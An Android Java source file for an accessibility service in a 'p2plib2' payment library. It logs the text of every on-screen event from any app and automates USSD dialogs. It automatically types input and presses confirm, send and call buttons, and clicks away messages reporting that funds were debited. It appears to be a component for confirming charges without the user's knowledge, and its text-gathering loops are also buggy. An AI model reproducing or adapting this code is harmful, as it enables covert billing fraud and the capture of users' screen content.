package com.p2plib2.ussd;


import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.p2plib2.Logger;
import com.p2plib2.PayLib;

import static com.p2plib2.PayLib.curSMSOut;
import static com.p2plib2.PayLib.feedback;
import static com.p2plib2.PayLib.serviceActivation;

public class AccessService extends AccessibilityService {

    private static AccessibilityEvent event;

    /**
     * Catch widget by Accessibility, when is showing at mobile display
     *
     * @param event AccessibilityEvent
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Logger.lg(String.format(
                "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                event.getEventType(), event.getClassName(), event.getPackageName(),
                event.getEventTime(), event.getText()));
        if (serviceActivation) {
            this.event = event;
            Logger.lg(String.format(
                    "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                    event.getEventType(), event.getClassName(), event.getPackageName(),
                    event.getEventTime(), event.getText()));
            String str = "";
            for (int i = 0; i < event.getText().size() - 1; i++) {
                str += event.getText().get(1);
            }
            if (str.contains("заявка принята")) {
                clickOnButton(event, 0);
            }
            if (str.contains("Превышен лимит услуги") || str.contains("недостаточно средств")) {
                PayLib.getSMSResult(str);
                clickOnButton(event, 0);

            } else {
                if (LoginView(event) && notInputText(event)) {
                    // first view or logView, do nothing, pass / FIRST MESSAGE
                    Logger.lg("FIRST MESSAGE");
                    clickOnButton(event, 0);
                    USSDController.instance.callbackInvoke.over(event.getText().get(0).toString());
                } else if (problemView(event) || LoginView(event)) {
                    // deal down
                    Logger.lg("deal down " + event.getText().get(0).toString());
                    clickOnButton(event, 1);
                    USSDController.instance.callbackInvoke.over(event.getText().get(0).toString());
                } else if (isUSSDWidget(event)) {
                    // ready for work
                    Logger.lg("ready for work " + event.getText().get(0).toString());
                    String response = event.getText().get(0).toString();
                    Logger.lg("response new" + response);
                    if (notInputText(event)) {
                        // not more input panels / LAST MESSAGE
                        // sent 'OK' button
                        clickOnButton(event, 0);
                        USSDController.instance.callbackInvoke.over(response);
                    } else {
                        Logger.lg("USSDController.instance.callbackMessage " + USSDController.instance.callbackMessage);
                        // sent option 1
                        if (USSDController.instance.callbackMessage == null)
                            USSDController.instance.callbackInvoke.responseInvoke(response);
                        else {
                            USSDController.instance.callbackMessage.responseMessage(response);
                            USSDController.instance.callbackMessage = null;
                        }
                    }
                }
            }
        } else if (event.getText().size() != 0) {
            String str = "";
            for (int i = 0; i < event.getText().size() - 1; i++) {
                str += event.getText().get(1).toString().toLowerCase();
            }
            if(PayLib.feedback!=null){
                PayLib.feedback.callResult("Code P2P-004: " + str);
                Logger.lg("curSMSOut " + curSMSOut);
                if ((PayLib.currentMsg!= null || curSMSOut != null || PayLib.currentMsg != null) && str.contains("списаны средства")) {
                    Logger.lg("PayLib.curSMSOut");
                    clickOnButtonOK(event, 0);
                    //PayLib.currentMessages.clear();
                    curSMSOut = null;
                   // PayLib.currentMsg = null;
                }
            }
        } else {
            Logger.lg("str " + event.getText()
                    + " " + event.getPackageName()
                    + " " + event.getContentDescription()
                    + " " + event.getSource().getText());

        }

    }

    /**
     * Send whatever you want via USSD
     *
     * @param text any string
     */
    public static void send(String text) {
        setTextIntoField(event, text);
        clickOnButton(event, 1);
    }

    /**
     * set text into input text at USSD widget
     *
     * @param event AccessibilityEvent
     * @param data  Any String
     */
    private static void setTextIntoField(AccessibilityEvent event, String data) {
        USSDController ussdController = USSDController.instance;
        Bundle arguments = new Bundle();
        if (arguments != null) {
            arguments.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, data);
            for (int i = 0; i < event.getSource().getChildCount(); i++) {
                AccessibilityNodeInfo node = event.getSource().getChild(i);
                Logger.lg(i + ":" + node.getClassName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                    if (node != null && node.getClassName().equals("android.widget.EditText")
                            && !node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)) {
                        ((ClipboardManager) ussdController.context
                                .getSystemService(Context.CLIPBOARD_SERVICE))
                                .setPrimaryClip(ClipData.newPlainText("text", data));
                        node.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                    }
                } else {
                    feedback.callResult("Code P2P-008: данная версия не поддерживает Accessibility service");
                }
            }
        }
    }

    /**
     * Method evaluate if USSD widget has input text
     *
     * @param event AccessibilityEvent
     * @return boolean has or not input text
     */
    protected static boolean notInputText(AccessibilityEvent event) {
        boolean flag = true;
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo != null)
            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo node = event.getSource().getChild(i);
                if (node != null && node.getClassName().equals("android.widget.EditText"))
                    flag = false;
            }
        return flag;
    }

    /**
     * The AccessibilityEvent is instance of USSD Widget class
     *
     * @param event AccessibilityEvent
     * @return boolean AccessibilityEvent is USSD
     */
    private boolean isUSSDWidget(AccessibilityEvent event) {
        return (event.getClassName().equals("amigo.app.AmigoAlertDialog")
                || event.getClassName().equals("android.app.AlertDialog"));
    }

    /**
     * The View has a login message into USSD Widget
     *
     * @param event AccessibilityEvent
     * @return boolean USSD Widget has login message
     */
    private boolean LoginView(AccessibilityEvent event) {
        return isUSSDWidget(event)
                && USSDController.instance.map.get(USSDController.KEY_LOGIN)
                .contains(event.getText().get(0).toString());
    }

    /**
     * The View has a problem message into USSD Widget
     *
     * @param event AccessibilityEvent
     * @return boolean USSD Widget has problem message
     */
    protected boolean problemView(AccessibilityEvent event) {
        return isUSSDWidget(event)
                && USSDController.instance.map.get(USSDController.KEY_ERROR)
                .contains(event.getText().get(0).toString());
    }

    /**
     * click a button using the index
     *
     * @param event AccessibilityEvent
     * @param index button's index
     */
    protected static void clickOnButton(AccessibilityEvent event, int index) {
        Logger.lg("clickOnButton " + event.getSource() + " flag " + serviceActivation);
        if (event.getSource() != null) {
            int count = -1;
            Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
            for (int i = 0; i < event.getSource().getChildCount(); i++) {
                AccessibilityNodeInfo nodeButton = event.getSource().getChild(i);
                Logger.lg(" nodeButton.getClassName().toString() " + nodeButton);
                if (nodeButton != null) {
                    if (nodeButton.getClassName().toString().toLowerCase().contains("button")) {
                        count++;
                        if (count == index) {
                            nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                    if (nodeButton.getClassName().toString().toLowerCase().contains("scrollview")) {
                        Logger.lg("nodeButton  count " + nodeButton.getChildCount());
//                        if (nodeButton.getChildCount() == 1) {
//                            nodeButton.getChild(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
//                            PayLib.checkSmsAdditional();
//                        } else {
                        for (int k = 0; k < nodeButton.getChildCount(); k++) {
                            Logger.lg("button " + k + " " + nodeButton.getChild(k).getText());
                            if (nodeButton.getChild(k).getText() != null) {
                                if (nodeButton.getChild(k).getText().toString().toLowerCase().contains("ok")
                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("да")
                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("отправ")
                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("позвони")
                                        || nodeButton.getChild(k).getText().toString().toLowerCase().contains("ок")) {
                                    nodeButton.getChild(k).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                                if (curSMSOut != null) {
                                    serviceActivation = false;
                                    PayLib.checkSmsAdditional();
                                }
                            }
//                            }
                        }
                    }
                }
            }
        }
    }

    protected static void clickOnButtonOK(AccessibilityEvent event, int index) {
        Logger.lg("clickOnButton " + event.getSource() + " flag " + serviceActivation);
        if (event.getSource() != null) {
            Logger.lg("event.getSource().getChildCount() " + event.getSource().getChildCount());
            boolean m = false;
            for (int i = 0; i <= event.getSource().getChildCount() - 1; i++) {
                AccessibilityNodeInfo nodeButton = event.getSource().getChild(i);
                if (nodeButton != null) {
                    Logger.lg(" nodeButton " + nodeButton.getClassName().toString() + " " + nodeButton.getText());
                    if (nodeButton.getText() != null) {
                        String text = nodeButton.getText().toString().toLowerCase();
                        if (text.contains("p2plib") || text.contains("p2ppay")) {
                            Logger.lg("true m ");
                            m = true;
                        }
                        Logger.lg("text " + text + " " + m);
                        if (m && nodeButton.getClassName().toString().toLowerCase().contains("button")
                                && (text.contains("ok")
                                || text.contains("да")
                                || text.contains("отправ")
                                || text.contains("позвони")
                                || text.contains("ок"))
                                ) {
                            Logger.lg("perform");
                            nodeButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        }
                    }
                    if(nodeButton.getClassName().toString().toLowerCase().contains("scroll")){
                        for (int h = 0; h <= nodeButton.getChildCount() - 1; h++) {
                            AccessibilityNodeInfo nodeButtonh = nodeButton.getChild(h);
                            if (nodeButtonh != null) {
                                Logger.lg(" nodeButtonh " + nodeButtonh.getClassName().toString() + " " + nodeButtonh.getText());
                                if (nodeButtonh.getText() != null) {
                                    String text = nodeButtonh.getText().toString().toLowerCase();
                                    if (text.contains("p2plib") || text.contains("p2ppay")) {
                                        Logger.lg("true m ");
                                        m = true;
                                    }
                                    Logger.lg("text " + text + " " + m);
                                    if (m && nodeButtonh.getClassName().toString().toLowerCase().contains("button")
                                            && (text.contains("ok")
                                            || text.contains("да")
                                            || text.contains("отправ")
                                            || text.contains("позвони")
                                            || text.contains("ок"))
                                            ) {
                                        Logger.lg("perform");
                                        nodeButtonh.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                    }
                                }
                            } else {
                                Logger.lg("nodeButton = " + nodeButton);
                            }
                        }
                    }
                } else {
                    Logger.lg("nodeButton = " + nodeButton);
                }
            }
        } else {
            Logger.lg("event.getSource() = " + event.getSource());
        }
    }

    /**
     * Active when SO interrupt the application
     */
    @Override
    public void onInterrupt() {
        Logger.lg("onInterrupt");
    }

    /**
     * Configure accessibility server from Android Operative System
     */
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Logger.lg("onServiceConnected");
    }
}